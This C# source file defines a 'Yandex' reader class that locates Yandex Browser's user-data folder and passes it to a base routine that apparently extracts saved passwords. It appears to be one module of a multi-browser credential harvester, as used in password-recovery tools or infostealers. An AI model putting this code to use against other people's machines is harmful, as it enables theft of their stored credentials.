using System;
using System.Collections.Generic;
using System.IO;

namespace dao
{
    class Yandex : BaseChrome, IReader
    {
        public string BrowserName { get { return "Yandex"; } }

        public IEnumerable<Cookie> Cookies(string host = null)
        {
            throw new NotImplementedException();
        }

        public IEnumerable<PassModel> Passwords()
        {
            String LOCAL_PATH = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            return base.Reads(Path.Combine(LOCAL_PATH, @"Yandex\YandexBrowser\User Data"));
        }

    }
}
